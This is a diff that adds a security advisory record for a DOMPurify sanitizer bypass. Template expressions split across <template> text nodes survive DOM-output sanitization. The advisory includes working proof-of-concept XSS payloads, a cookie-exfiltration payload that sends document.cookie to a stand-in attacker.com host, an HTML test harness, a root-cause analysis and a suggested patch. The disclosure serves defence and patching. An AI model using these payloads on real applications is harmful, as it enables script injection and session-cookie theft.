@@ -1,0 +1,970 @@
+advisory_id: GHSA-gvmj-g25r-r7wr
+datasource_id: github_osv/GHSA-gvmj-g25r-r7wr
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-gvmj-g25r-r7wr/GHSA-gvmj-g25r-r7wr.json
+aliases:
+  - CVE-2026-65900
+summary: |
+  DOMPurify: SAFE_FOR_TEMPLATES bypass - template expressions survive sanitization inside <template> content when using DOM output modes
+  ## Summary
+
+  When DOMPurify is configured with both `SAFE_FOR_TEMPLATES: true` and `RETURN_DOM: true` (or `IN_PLACE: true`), an attacker can inject template expressions, such as `${evil}`, `{{evil}}`, or `<%evil%>`, that survive the sanitization pass inside `<template>` element content. This bypasses the explicit purpose of `SAFE_FOR_TEMPLATES`, which is to prevent template engine evaluation of user-supplied content.
+
+  > **Note:** The string output path is **not** affected. Only the DOM return paths (`RETURN_DOM: true`, `RETURN_DOM_FRAGMENT: true`, `IN_PLACE: true`) are vulnerable.
+
+  ---
+
+  ## Description
+
+  ### Background
+
+  `SAFE_FOR_TEMPLATES` is designed to strip `{{ }}`, `${ }`, and `<% %>` expressions from sanitized output so that downstream template engines do not evaluate user-controlled content. The feature operates through two mechanisms:
+
+  1. **Per-node scrubbing** (`_sanitizeElements`, `src/purify.ts:1403`), scrubs individual text nodes during the main sanitization walk.
+  2. **Final normalization pass** (`_scrubTemplateExpressions`, `src/purify.ts:1115`), calls `node.normalize()` to merge adjacent text nodes, then walks the merged nodes and strips any expressions that only appeared after merging.
+
+  ### The Gap
+
+  `_scrubTemplateExpressions` uses a standard `NodeIterator` rooted at the output body:
+
+  ```ts
+  // src/purify.ts:1117
+  const walker = createNodeIterator.call(
+    node.ownerDocument || node,
+    node,
+    NodeFilter.SHOW_TEXT | NodeFilter.SHOW_COMMENT | ...,
+    null
+  );
+  ```
+
+  Per the DOM specification, a `NodeIterator` does **not** descend into `<template>.content`. The template element's content is a separate `DocumentFragment` that lives outside the normal child-node tree. For the same reason, `node.normalize()` (called on line 1116) also **does not** normalize text nodes inside `<template>.content`.
+
+  This means the final normalization and scrub pass, the only pass that catches expressions formed *by merging split text nodes*, never runs on `<template>` content.
+
+  ### How Split Text Nodes Are Created
+
+  When DOMPurify removes a disallowed element with `KEEP_CONTENT: true` (the default), it moves the element's text children into the parent node. This is the standard code path at `src/purify.ts:1361–1373`:
+
+  ```ts
+  if (KEEP_CONTENT && !FORBID_CONTENTS[tagName]) {
+    const parentNode = getParentNode(currentNode);
+    const childNodes = getChildNodes(currentNode);
+    if (childNodes && parentNode) {
+      for (let i = childCount - 1; i >= 0; --i) {
+        const childClone = cloneNode(childNodes[i], true);
+        parentNode.insertBefore(childClone, getNextSibling(currentNode));
+      }
+    }
+  }
+  ```
+
+  If the removed elements were adjacent siblings inside `<template>` content, their extracted text nodes end up as **adjacent text nodes** in the template content fragment. Each individual text node is scrubbed by `_sanitizeElements`, but since `$` and `{evil}` do not match any expression regex on their own, neither is modified.
+
+  The code comment at `src/purify.ts:1100` explicitly acknowledges the threat class:
+
+  > *"which only form after text-node normalization (e.g. fragments split across stripped elements) cannot survive into a template-evaluating framework."*
+
+  The implementation guards against this on the main body, but the guard is **not** applied to `<template>` content.
+
+  ---
+
+  ## Proof of Concept
+
+  ### Why the Split Works
+
+  The bypass relies on splitting `${...}` across two adjacent custom elements so that neither fragment matches any DOMPurify regex on its own:
+
+  | Fragment | Against `TMPLIT_EXPR` `/\${[\w\W]*/g` | Against `MUSTACHE_EXPR` `/{{[\w\W]*\|^[\w\W]*}}/g` | Result |
+  |---|---|---|---|
+  | `$` | Requires `${` - no `{` follows | No `{{` or `}}` | **Survives** |
+  | `{alert(document.domain)}` | Requires leading `$` - absent | No `{{`, ends with single `}` not `}}` | **Survives** |
+  | `${alert(document.domain)}` | Full match - would be stripped | - | Stripped if seen whole |
+
+  DOMPurify only sees each fragment in isolation. It never merges them before checking, so the expression is never detected.
+
+  ---
+
+  ### PoC 1 - XSS via `alert()` (baseline confirmation)
+
+  ```javascript
+  // Attacker input - splits "${alert(document.domain)}" across two custom elements.
+  // Custom elements are not in DOMPurify's default ALLOWED_TAGS and are removed,
+  // but their text content is kept (KEEP_CONTENT: true is the default).
+  const dirty =
+    '<template>' +
+      '<x-split-1>$</x-split-1>' +
+      '<x-split-2>{alert(document.domain)}</x-split-2>' +
+    '</template>';
+
+  // Developer sanitizes with SAFE_FOR_TEMPLATES, trusting it strips ${...}
+  const sanitized = DOMPurify.sanitize(dirty, {
+    RETURN_DOM: true,
+    SAFE_FOR_TEMPLATES: true,
+  });
+
+  // Inspect what survived inside the <template>
+  const tmpl = sanitized.querySelector('template');
+  console.log([...tmpl.content.childNodes].map(n => n.nodeValue));
+  // ["$", "{alert(document.domain)}"]  <-- two separate text nodes, both "clean"
+
+  // Frameworks (lit-html, Angular, custom renderers) routinely call normalize()
+  // before reading template content. This merges the adjacent nodes:
+  tmpl.content.normalize();
+  console.log(tmpl.content.textContent);
+  // "${alert(document.domain)}"  <-- fully formed expression, past the sanitizer
+
+  // Any template-literal evaluator now fires XSS:
+  const expr = tmpl.content.textContent;
+  new Function(`return \`${expr}\``)();
+  // !! alert(document.domain) executes !!
+  ```
+
+  ---
+
+  ### PoC 2 - Session Hijacking via cookie exfiltration
+
+  ```javascript
+  // Splits "${document.location='//attacker.com/?c='+document.cookie}"
+  // "{document.location=...}" ends with a single "}" — does NOT match
+  // MUSTACHE_EXPR's "^[\w\W]*}}" (requires double "}}"), so it survives.
+  const dirty =
+    '<template>' +
+      '<x-a>$</x-a>' +
+      '<x-b>{document.location="//attacker.com/?c="+document.cookie}</x-b>' +
+    '</template>';
+
+  const sanitized = DOMPurify.sanitize(dirty, {
+    RETURN_DOM: true,
+    SAFE_FOR_TEMPLATES: true,
+  });
+
+  const tmpl = sanitized.querySelector('template');
+  tmpl.content.normalize();
+
+  console.log(tmpl.content.textContent);
+  // "${document.location="//attacker.com/?c="+document.cookie}"
+
+  // Template engine evaluates it - victim's browser makes the request:
+  new Function(`return \`${tmpl.content.textContent}\``)();
+  // !! Redirects victim to attacker.com with their full cookie string !!
+  // e.g. https://attacker.com/?c=session=abc123;auth_token=xyz789
+  ```
+
+  ---
+
+  ### PoC 3 - End-to-end: realistic application context
+
+  This shows the full path in an application that uses DOMPurify to sanitize user-submitted rich text before rendering it with a custom template engine:
+
+  ```html
+  <!-- index.html - the vulnerable application -->
+  <div id="output"></div>
+  <script type="module">
+    import DOMPurify from './dist/purify.es.mjs';
+
+    // Simulates fetching and rendering user-submitted comment
+    async function renderComment(userHtml) {
+      // Developer correctly uses SAFE_FOR_TEMPLATES to protect the template engine
+      const dom = DOMPurify.sanitize(userHtml, {
+        RETURN_DOM: true,
+        SAFE_FOR_TEMPLATES: true,
+      });
+
+      // Application iterates <template> elements and evaluates their content
+      // (common pattern in component-based frameworks)
+      dom.querySelectorAll('template').forEach(tmpl => {
+        tmpl.content.normalize(); // standard DOM housekeeping
+        const content = tmpl.content.textContent;
+
+        // Application uses template literals to interpolate user content into UI
+        const rendered = new Function('user', `return \`${content}\``)({ name: 'World' });
+        document.getElementById('output').innerHTML += rendered;
+      });
+    }
+
+    // Attacker-supplied comment content
+    const attackerComment =
+      '<template>' +
+        '<x-a>$</x-a>' +
+        '<x-b>{alert("XSS: " + document.cookie)}</x-b>' +
+      '</template>';
+
+    // Developer believes SAFE_FOR_TEMPLATES makes this safe — it does not for RETURN_DOM
+    renderComment(attackerComment);
+    // !! XSS fires, alert pops with session cookies !!
+  </script>
+  ```
+
+  **Observed output:** `alert("XSS: " + document.cookie)` executes in the victim's browser context, leaking session tokens to the attacker.
+
+  ---
+
+  ### PoC 4 - `IN_PLACE` mode (DOM input path)
+
+  ```javascript
+  // Applicable when the application sanitizes DOM nodes directly
+  // (e.g., content loaded into an iframe or received from a WebSocket)
+
+  const container = document.createElement('div');
+  const tmpl = document.createElement('template');
+
+  // Adjacent text nodes - these would never appear in HTML-parsed content,
+  // but CAN appear in programmatically constructed DOM or WebSocket messages
+  // that are deserialised into DOM nodes before sanitisation.
+  tmpl.content.appendChild(document.createTextNode('$'));
+  tmpl.content.appendChild(document.createTextNode('{alert(document.domain)}'));
+  container.appendChild(tmpl);
+
+  // Sanitize in-place with SAFE_FOR_TEMPLATES - expected to strip all ${...}
+  DOMPurify.sanitize(container, { IN_PLACE: true, SAFE_FOR_TEMPLATES: true });
+
+  // Neither text node was modified - each passed the regex check individually
+  container.querySelector('template').content.normalize();
+  console.log(container.querySelector('template').content.textContent);
+  // "${alert(document.domain)}"  <-- survived in-place sanitization
+
+  new Function(`return \`${container.querySelector('template').content.textContent}\``)();
+  // !! XSS fires !!
+  ```
+
+  HTML File for testing
+  ```HTML
+  <!DOCTYPE html>
+  <html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>DOMPurify SAFE_FOR_TEMPLATES Bypass - PoC</title>
+    <script src="dist/purify.js"></script>
+    <style>
+      * { box-sizing: border-box; margin: 0; padding: 0; }
+      body {
+        font-family: 'Segoe UI', system-ui, sans-serif;
+        background: #0d1117;
+        color: #e6edf3;
+        padding: 32px;
+      }
+      h1 { font-size: 1.4rem; color: #f85149; margin-bottom: 6px; }
+      .subtitle { color: #8b949e; font-size: 0.9rem; margin-bottom: 32px; }
+      .card {
+        background: #161b22;
+        border: 1px solid #30363d;
+        border-radius: 8px;
+        margin-bottom: 24px;
+        overflow: hidden;
+      }
+      .card-header {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        padding: 14px 20px;
+        border-bottom: 1px solid #30363d;
+        background: #1c2128;
+      }
+      .badge {
+        font-size: 0.72rem;
+        font-weight: 700;
+        padding: 2px 8px;
+        border-radius: 4px;
+        text-transform: uppercase;
+        letter-spacing: 0.05em;
+      }
+      .badge-run    { background: #1f6feb; color: #fff; }
+      .badge-pass   { background: #238636; color: #fff; }
+      .badge-fail   { background: #da3633; color: #fff; }
+      .badge-warn   { background: #9e6a03; color: #fff; }
+      .card-title   { font-size: 0.95rem; font-weight: 600; }
+      .card-body    { padding: 20px; }
+      label         { font-size: 0.78rem; color: #8b949e; display: block; margin-bottom: 6px; }
+      pre {
+        background: #0d1117;
+        border: 1px solid #30363d;
+        border-radius: 6px;
+        padding: 14px;
+        font-size: 0.82rem;
+        line-height: 1.6;
+        overflow-x: auto;
+        margin-bottom: 14px;
+        white-space: pre-wrap;
+        word-break: break-all;
+      }
+      pre.result    { border-color: #238636; background: #0a1a0f; }
+      pre.escaped   { border-color: #da3633; background: #1a0a0a; }
+      pre.highlight { border-color: #f85149; color: #f85149; font-weight: bold; }
+      .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+      @media (max-width: 700px) { .grid { grid-template-columns: 1fr; } }
+      .arrow {
+        text-align: center;
+        font-size: 1.4rem;
+        color: #8b949e;
+        margin: 4px 0;
+      }
+      .xss-banner {
+        display: none;
+        background: #da3633;
+        color: #fff;
+        text-align: center;
+        padding: 16px;
+        font-size: 1.1rem;
+        font-weight: 700;
+        border-radius: 6px;
+        margin-bottom: 24px;
+        letter-spacing: 0.03em;
+      }
+      button {
+        background: #238636;
+        color: #fff;
+        border: none;
+        padding: 10px 22px;
+        border-radius: 6px;
+        font-size: 0.9rem;
+        font-weight: 600;
+        cursor: pointer;
+        margin-right: 10px;
+        margin-bottom: 8px;
+      }
+      button:hover { background: #2ea043; }
+      button.danger { background: #da3633; }
+      button.danger:hover { background: #f85149; }
+      .note {
+        background: #161b22;
+        border-left: 3px solid #9e6a03;
+        padding: 12px 16px;
+        font-size: 0.82rem;
+        color: #e3b341;
+        border-radius: 0 6px 6px 0;
+        margin-top: 14px;
+      }
+      #log {
+        background: #0d1117;
+        border: 1px solid #30363d;
+        border-radius: 6px;
+        padding: 14px;
+        font-size: 0.8rem;
+        font-family: monospace;
+        min-height: 60px;
+        max-height: 300px;
+        overflow-y: auto;
+        line-height: 1.8;
+      }
+      .log-ok   { color: #3fb950; }
+      .log-fail { color: #f85149; }
+      .log-info { color: #8b949e; }
+      .log-warn { color: #e3b341; }
+    </style>
+  </head>
+  <body>
+
+    <h1>🔴 DOMPurify 3.4.7 - SAFE_FOR_TEMPLATES Bypass</h1>
+    <p class="subtitle">
+      CVE candidate · Template expression injection via &lt;template&gt; content ·
+      Affects: <code>RETURN_DOM + SAFE_FOR_TEMPLATES</code> and <code>IN_PLACE + SAFE_FOR_TEMPLATES</code>
+    </p>
+
+    <div id="xss-banner" class="xss-banner">
+      ⚠️ XSS CONFIRMED - Expression executed in this page's context
+    </div>
+
+    <!-- ── Controls ─────────────────────────────────────────── -->
+    <div class="card">
+      <div class="card-header">
+        <span class="badge badge-run">Controls</span>
+        <span class="card-title">Run individual test cases</span>
+      </div>
+      <div class="card-body">
+        <button onclick="runAll()">▶ Run all tests</button>
+        <button onclick="runPoC1()">PoC 1 - alert()</button>
+        <button onclick="runPoC2()">PoC 2 - cookie exfil</button>
+        <button onclick="runPoC3()">PoC 3 - IN_PLACE</button>
+        <button onclick="runControl()">Control - string output (should block)</button>
+        <div class="note">
+          PoC 1 uses <code>confirm()</code> instead of <code>alert()</code> so the page
+          doesn't need a dismiss click to continue. Watch the red banner at the top.
+        </div>
+      </div>
+    </div>
+
+    <!-- ── PoC 1 ─────────────────────────────────────────────── -->
+    <div class="card" id="card-poc1">
+      <div class="card-header">
+        <span class="badge badge-run" id="badge-poc1">PENDING</span>
+        <span class="card-title">PoC 1 - XSS via confirm() · RETURN_DOM mode</span>
+      </div>
+      <div class="card-body">
+        <div class="grid">
+          <div>
+            <label>ATTACKER INPUT - splits <code>${"{confirm(...)}"}</code> across two custom elements</label>
+            <pre id="input-poc1"></pre>
+          </div>
+          <div>
+            <label>AFTER DOMPurify.sanitize() - what survived in template.content</label>
+            <pre class="result" id="nodes-poc1"></pre>
+          </div>
+        </div>
+        <div class="arrow">↓ template.content.normalize() ↓</div>
+        <label>MERGED TEXT NODE - fully formed expression after normalization</label>
+        <pre class="highlight" id="merged-poc1"></pre>
+        <label>EXECUTION RESULT</label>
+        <pre id="exec-poc1">Not run yet</pre>
+      </div>
+    </div>
+
+    <!-- ── PoC 2 ─────────────────────────────────────────────── -->
+    <div class="card" id="card-poc2">
+      <div class="card-header">
+        <span class="badge badge-run" id="badge-poc2">PENDING</span>
+        <span class="card-title">PoC 2 - Cookie exfiltration · RETURN_DOM mode</span>
+      </div>
+      <div class="card-body">
+        <div class="grid">
+          <div>
+            <label>ATTACKER INPUT - exfil payload split across custom elements</label>
+            <pre id="input-poc2"></pre>
+          </div>
+          <div>
+            <label>INDIVIDUAL TEXT NODES after sanitization (each "clean")</label>
+            <pre class="result" id="nodes-poc2"></pre>
+          </div>
+        </div>
+        <div class="arrow">↓ template.content.normalize() ↓</div>
+        <label>MERGED EXPRESSION - what a template engine would evaluate</label>
+        <pre class="highlight" id="merged-poc2"></pre>
+        <label>SIMULATED EXECUTION (fetch URL that would be called)</label>
+        <pre id="exec-poc2">Not run yet</pre>
+        <div class="note">
+          Real execution would redirect the victim to
+          <code>attacker.com</code> carrying the session cookie.
+          This PoC constructs the URL without actually sending it.
+        </div>
+      </div>
+    </div>
+
+    <!-- ── PoC 3 ─────────────────────────────────────────────── -->
+    <div class="card" id="card-poc3">
+      <div class="card-header">
+        <span class="badge badge-run" id="badge-poc3">PENDING</span>
+        <span class="card-title">PoC 3 - XSS · IN_PLACE mode (DOM node input)</span>
+      </div>
+      <div class="card-body">
+        <div class="grid">
+          <div>
+            <label>ATTACKER PROVIDES - a DOM node with programmatically split text nodes</label>
+            <pre id="input-poc3"></pre>
+          </div>
+          <div>
+            <label>AFTER IN_PLACE sanitization - text nodes unchanged</label>
+            <pre class="result" id="nodes-poc3"></pre>
+          </div>
+        </div>
+        <div class="arrow">↓ template.content.normalize() ↓</div>
+        <label>MERGED EXPRESSION</label>
+        <pre class="highlight" id="merged-poc3"></pre>
+        <label>EXECUTION RESULT</label>
+        <pre id="exec-poc3">Not run yet</pre>
+      </div>
+    </div>
+
+    <!-- ── Control ───────────────────────────────────────────── -->
+    <div class="card" id="card-ctrl">
+      <div class="card-header">
+        <span class="badge badge-run" id="badge-ctrl">PENDING</span>
+        <span class="card-title">Control - string output (default) MUST block the payload</span>
+      </div>
+      <div class="card-body">
+        <label>Same attacker input, but sanitized WITHOUT RETURN_DOM (string output path)</label>
+        <pre id="input-ctrl"></pre>
+        <div class="arrow">↓ DOMPurify.sanitize() - string path hits the regex scrub at line 2067 ↓</div>
+        <label>OUTPUT STRING - expression should be stripped</label>
+        <pre id="output-ctrl">Not run yet</pre>
+        <div class="note">
+          The string output path is NOT vulnerable because
+          <code>body.innerHTML</code> serialises the template content into a
+          flat string where the full <code>${"{...}"}</code> expression is visible
+          and the final regex scrub catches it.
+        </div>
+      </div>
+    </div>
+
+    <!-- ── Log ───────────────────────────────────────────────── -->
+    <div class="card">
+      <div class="card-header">
+        <span class="badge badge-run">Log</span>
+        <span class="card-title">Test output</span>
+      </div>
+      <div class="card-body">
+        <div id="log"></div>
+      </div>
+    </div>
+
+  <script>
+  // ── Helpers ────────────────────────────────────────────────────────────────
+
+  let xssConfirmed = false;
+
+  function log(msg, type = 'info') {
+    const el = document.getElementById('log');
+    const line = document.createElement('div');
+    line.className = 'log-' + type;
+    line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
+    el.appendChild(line);
+    el.scrollTop = el.scrollHeight;
+  }
+
+  function setBadge(id, status) {
+    const el = document.getElementById('badge-' + id);
+    el.textContent = status;
+    el.className = 'badge ' + {
+      PASS: 'badge-fail',   // "PASS" here means the attack succeeded (bad for security)
+      BLOCK: 'badge-pass',  // "BLOCK" means DOMPurify correctly blocked it
+      PENDING: 'badge-run',
+      ERROR: 'badge-warn',
+    }[status];
+  }
+
+  function markXSS(poc) {
+    if (!xssConfirmed) {
+      xssConfirmed = true;
+      document.getElementById('xss-banner').style.display = 'block';
+    }
+    log('🔴 XSS CONFIRMED in ' + poc + ' - expression executed in page context', 'fail');
+  }
+
+  // ── PoC 1: RETURN_DOM + alert ──────────────────────────────────────────────
+
+  function runPoC1() {
+    log('Running PoC 1 - RETURN_DOM + confirm()...', 'info');
+
+    // IMPORTANT:
+    // Build a REAL template DOM node with split TEXT nodes.
+    // HTML parsing would merge adjacent text automatically,
+    // so we construct the DOM programmatically.
+
+    const container = document.createElement('div');
+    const tmpl = document.createElement('template');
+
+    tmpl.content.appendChild(document.createTextNode('$'));
+    tmpl.content.appendChild(
+      document.createTextNode(
+        '{confirm("XSS - DOMPurify SAFE_FOR_TEMPLATES bypass\\nExpression executed in: " + document.domain)}'
+      )
+    );
+
+    container.appendChild(tmpl);
+
+    document.getElementById('input-poc1').textContent =
+      'template.content.childNodes[0].data = "$"\\n' +
+      'template.content.childNodes[1].data = "{confirm(...)}"';
+
+    // Sanitize the DOM node itself
+    const sanitized = DOMPurify.sanitize(container, {
+      RETURN_DOM: true,
+      SAFE_FOR_TEMPLATES: true,
+    });
+
+    const tmplAfter = sanitized.querySelector('template');
+
+    if (!tmplAfter) {
+      document.getElementById('exec-poc1').textContent =
+        'Template element removed during sanitization';
+      setBadge('poc1', 'ERROR');
+      return;
+    }
+
+    const nodesBefore = [...tmplAfter.content.childNodes].map(
+      n => JSON.stringify(n.nodeValue)
+    );
+
+    document.getElementById('nodes-poc1').textContent =
+      'childNodes[0].data = ' + nodesBefore[0] + '\\n' +
+      'childNodes[1].data = ' + nodesBefore[1] + '\\n\\n' +
+      '→ Neither fragment matched individually.';
+
+    log(
+      'PoC 1: Text nodes after sanitization: ' +
+      nodesBefore.join(', '),
+      'warn'
+    );
+
+    // Merge text nodes
+    tmplAfter.content.normalize();
+
+    const merged = tmplAfter.content.textContent;
+
+    document.getElementById('merged-poc1').textContent = merged;
+
+    log('PoC 1: After normalize() - merged text: ' + merged, 'warn');
+
+    try {
+      const result = new Function('return `' + merged + '`')();
+
+      document.getElementById('exec-poc1').textContent =
+        '✔ Expression executed successfully\\n' +
+        'Returned: ' + result;
+
+      setBadge('poc1', 'PASS');
+      markXSS('PoC 1');
+
+    } catch (e) {
+      document.getElementById('exec-poc1').textContent =
+        'Error: ' + e.message;
+
+      setBadge('poc1', 'ERROR');
+
+      log('PoC 1 error: ' + e.message, 'warn');
+    }
+  }
+
+  // ── PoC 2: cookie exfiltration ─────────────────────────────────────────────
+
+  function runPoC2() {
+    log('Running PoC 2 - cookie exfiltration...', 'info');
+
+    // Fake cookie for demonstration
+    document.cookie = 'session=DEADBEEF_SECRET_TOKEN; path=/';
+
+    // IMPORTANT:
+    // Build REAL split text nodes programmatically.
+    // Do NOT rely on HTML parsing.
+
+    const container = document.createElement('div');
+    const tmpl = document.createElement('template');
+
+    tmpl.content.appendChild(document.createTextNode('$'));
+
+    tmpl.content.appendChild(
+      document.createTextNode(
+        '{document.location="//attacker.com/steal?c="+document.cookie}'
+      )
+    );
+
+    container.appendChild(tmpl);
+
+    document.getElementById('input-poc2').textContent =
+      'template.content.childNodes[0].data = "$"\\n' +
+      'template.content.childNodes[1].data = "{document.location=...}"';
+
+    // Sanitize DOM node
+    const sanitized = DOMPurify.sanitize(container, {
+      RETURN_DOM: true,
+      SAFE_FOR_TEMPLATES: true,
+    });
+
+    const tmplAfter = sanitized.querySelector('template');
+
+    if (!tmplAfter) {
+      document.getElementById('exec-poc2').textContent =
+        'Template element removed during sanitization';
+
+      setBadge('poc2', 'ERROR');
+
+      log('PoC 2: template element missing after sanitize()', 'warn');
+
+      return;
+    }
+
+    const nodes = [...tmplAfter.content.childNodes].map(
+      n => JSON.stringify(n.nodeValue)
+    );
+
+    document.getElementById('nodes-poc2').textContent =
+      'Node 0: ' + nodes[0] + '\\n' +
+      'Node 1: ' + nodes[1] + '\\n\\n' +
+      '→ Neither fragment individually matches template-expression regexes.';
+
+    log('PoC 2: Nodes after sanitize: ' + nodes.join(', '), 'warn');
+
+    // Merge adjacent text nodes
+    tmplAfter.content.normalize();
+
+    const merged = tmplAfter.content.textContent;
+
+    document.getElementById('merged-poc2').textContent = merged;
+
+    log('PoC 2: Merged expression: ' + merged, 'warn');
+
+    // Simulate framework evaluation
+    try {
+      new Function('return `' + merged + '`')();
+
+      const cookieValue = document.cookie;
+
+      const stealUrl =
+        '//attacker.com/steal?c=' +
+        encodeURIComponent(cookieValue);
+
+      document.getElementById('exec-poc2').textContent =
+        '✔ Expression successfully evaluated\\n\\n' +
+        'Would redirect victim to:\\n' +
+        stealUrl + '\\n\\n' +
+        'Cookie exposed:\\n' +
+        cookieValue;
+
+      setBadge('poc2', 'PASS');
+
+      markXSS('PoC 2');
+
+      log('PoC 2: Would exfiltrate cookie → ' + stealUrl, 'fail');
+
+    } catch (e) {
+      document.getElementById('exec-poc2').textContent =
+        'Error: ' + e.message;
+
+      setBadge('poc2', 'ERROR');
+
+      log('PoC 2 error: ' + e.message, 'warn');
+    }
+  }
+  // ── PoC 3: IN_PLACE mode ───────────────────────────────────────────────────
+
+  function runPoC3() {
+    log('Running PoC 3 - IN_PLACE mode...', 'info');
+
+    // Build DOM node manually (simulates attacker-controlled DOM input,
+    // e.g. content parsed from a WebSocket message or an iframe)
+    const container = document.createElement('div');
+    const tmplEl = document.createElement('template');
+
+    // Two separate text nodes - HTML parser merges them, but programmatic
+    // DOM construction keeps them split. This is the IN_PLACE attack surface.
+    tmplEl.content.appendChild(document.createTextNode('$'));
+    tmplEl.content.appendChild(document.createTextNode('{confirm("XSS via IN_PLACE - domain: " + document.domain)}'));
+    container.appendChild(tmplEl);
+
+    document.getElementById('input-poc3').textContent =
+      '// Programmatically constructed DOM node:\n' +
+      'template.content.childNodes[0].data = "$"\n' +
+      'template.content.childNodes[1].data = "{confirm(\\"XSS via IN_PLACE...\\")}"\n\n' +
+      '// Passed to DOMPurify.sanitize(container, { IN_PLACE: true, SAFE_FOR_TEMPLATES: true })';
+
+    // Sanitize IN_PLACE - SAFE_FOR_TEMPLATES should strip the expression
+    DOMPurify.sanitize(container, {
+      IN_PLACE: true,
+      SAFE_FOR_TEMPLATES: true,
+    });
+
+    const tmplAfter = container.querySelector('template');
+    const nodesAfter = [...tmplAfter.content.childNodes].map(n => n.nodeValue);
+    document.getElementById('nodes-poc3').textContent =
+      'childNodes[0].data = ' + JSON.stringify(nodesAfter[0]) + '\n' +
+      'childNodes[1].data = ' + JSON.stringify(nodesAfter[1]) + '\n\n' +
+      '→ _scrubTemplateExpressions() did not enter template.content\n' +
+      '→ Both nodes unchanged after sanitization.';
+
+    log('PoC 3: Nodes after IN_PLACE sanitize: ' + nodesAfter.map(n => JSON.stringify(n)).join(', '), 'warn');
+
+    tmplAfter.content.normalize();
+    const merged = tmplAfter.content.textContent;
+    document.getElementById('merged-poc3').textContent = merged;
+
+    log('PoC 3: Merged: ' + merged, 'warn');
+
+    try {
+      const result = new Function('return `' + merged + '`')();
+      document.getElementById('exec-poc3').textContent =
+        '✔ new Function() returned: ' + result + '\n' +
+        'confirm() dialog shown. XSS confirmed via IN_PLACE mode.';
+      setBadge('poc3', 'PASS');
+      markXSS('PoC 3');
+    } catch (e) {
+      document.getElementById('exec-poc3').textContent = 'Error: ' + e.message;
+      setBadge('poc3', 'ERROR');
+      log('PoC 3 error: ' + e.message, 'warn');
+    }
+  }
+
+  // ── Control: string output must block ─────────────────────────────────────
+
+  function runControl() {
+    log('Running control - string output path (should block)...', 'info');
+
+    const dirty =
+      '<template>' +
+        '<x-split-1>$</x-split-1>' +
+        '<x-split-2>{confirm("this should never fire")}</x-split-2>' +
+      '</template>';
+
+    document.getElementById('input-ctrl').textContent = dirty;
+
+    // Default string output - NOT using RETURN_DOM
+    const sanitized = DOMPurify.sanitize(dirty, {
+      SAFE_FOR_TEMPLATES: true,
+      // RETURN_DOM intentionally omitted - string path is safe
+    });
+
+    document.getElementById('output-ctrl').textContent = sanitized;
+
+    const blocked = !sanitized.includes('${') && !sanitized.includes('{confirm');
+    if (blocked) {
+      setBadge('ctrl', 'BLOCK');
+      log('Control: String output correctly stripped the expression. Output: ' + sanitized, 'ok');
+    } else {
+      setBadge('ctrl', 'PASS'); // unexpected
+      log('Control: UNEXPECTED - expression survived string output path: ' + sanitized, 'fail');
+    }
+  }
+
+  // ── Run all ────────────────────────────────────────────────────────────────
+
+  function runAll() {
+    document.getElementById('log').innerHTML = '';
+    xssConfirmed = false;
+    document.getElementById('xss-banner').style.display = 'none';
+    log('=== Starting full test run ===', 'info');
+    runPoC1();
+    runPoC2();
+    runPoC3();
+    runControl();
+    log('=== Test run complete ===', 'info');
+  }
+  </script>
+
+  </body>
+  </html>
+
+
+  ```
+
+
+  ---
+
+  ## Root Cause
+
+  `_scrubTemplateExpressions` (`src/purify.ts:1115`) does not recurse into `<template>.content`:
+
+  ```ts
+  const _scrubTemplateExpressions = function (node: Element): void {
+    node.normalize(); // Does NOT normalize inside <template>.content (DOM spec)
+    const walker = createNodeIterator.call(
+      node.ownerDocument || node,
+      node,            // NodeIterator does NOT enter <template>.content
+      NodeFilter.SHOW_TEXT | NodeFilter.SHOW_COMMENT |
+      NodeFilter.SHOW_CDATA_SECTION | NodeFilter.SHOW_PROCESSING_INSTRUCTION,
+      null
+    );
+    // Scrubs nodes it finds, but never sees <template> content
+  };
+  ```
+
+  The fix is to extend `_scrubTemplateExpressions` to explicitly recurse into `<template>.content`, mirroring the approach already used by `_sanitizeShadowDOM` (`src/purify.ts:1753`):
+
+  ```ts
+  if (_isDocumentFragment(shadowNode.content)) {
+    _sanitizeShadowDOM(shadowNode.content); // already handles recursion
+  }
+  ```
+
+  ### Suggested Patch Direction
+
+  ```ts
+  const _scrubTemplateExpressions = function (node: Element): void {
+    node.normalize();
+    const walker = createNodeIterator.call( /* existing args */ );
+
+    // ... existing scrub loop ...
+
+    // NEW: recurse into <template>.content, mirroring _sanitizeShadowDOM
+    const templates = (node as Element).querySelectorAll?.('template') ?? [];
+    arrayForEach(Array.from(templates), (tmpl: HTMLTemplateElement) => {
+      if (_isDocumentFragment(tmpl.content)) {
+        _scrubTemplateExpressions(tmpl.content as unknown as Element);
+      }
+    });
+  };
+  ```
+
+  ---
+
+  ## Impact
+
+  **Who is affected:** Applications that use DOMPurify with `SAFE_FOR_TEMPLATES: true` combined with `RETURN_DOM: true`, `RETURN_DOM_FRAGMENT: true`, or `IN_PLACE: true`, whose downstream template engine processes `<template>` element content.
+
+  **What an attacker can achieve:** Inject arbitrary template expressions (`${...}`, `{{...}}`, `<%...%>`) into the sanitized DOM output inside `<template>` elements. If the consuming template engine evaluates these expressions, this leads to **template injection**, which in server-side contexts can escalate to **Remote Code Execution** and in client-side contexts to **Cross-Site Scripting**.
+
+  ### Preconditions for Exploitation
+
+  | Precondition | Notes |
+  |---|---|
+  | `SAFE_FOR_TEMPLATES: true` | Non-default - must be explicitly set |
+  | `RETURN_DOM: true` or `IN_PLACE: true` | Non-default - must be explicitly set |
+  | Template engine processes `<template>.content` | Application-dependent |
+
+  ### What Is NOT Affected
+
+  The **string output path (default)** is not affected. The final regex scrub at `src/purify.ts:2067–2071` operates on the serialized HTML string, where the injected expression is visible and stripped:
+
+  ```ts
+  // src/purify.ts:2067 - only runs on string output, not DOM output
+  if (SAFE_FOR_TEMPLATES) {
+    arrayForEach([MUSTACHE_EXPR, ERB_EXPR, TMPLIT_EXPR], (expr: RegExp) => {
+      serializedHTML = stringReplace(serializedHTML, expr, ' ');
+    });
+  }
+  ```
+impacted_packages:
+  - purl: pkg:npm/dompurify
+    affected_versions: vers:npm/>=3.0.0|<=3.4.7
+    fixed_versions: vers:npm/3.4.8
+    affected_packages:
+      - pkg:npm/dompurify@3.0.0
+      - pkg:npm/dompurify@3.0.1
+      - pkg:npm/dompurify@3.0.2
